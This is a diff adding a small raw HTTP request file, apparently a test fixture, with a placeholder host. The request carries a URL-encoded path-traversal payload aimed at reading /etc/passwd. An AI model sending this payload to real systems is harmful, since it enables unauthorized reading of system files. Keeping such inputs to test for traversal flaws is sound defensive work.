@@ -1,0 +1,5 @@
+# placeholders: host
+# the dot segments must reach the socket unchanged; --path-as-is is implied
+GET /v1/files/%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
+Host: api.example.test
+Accept: */*
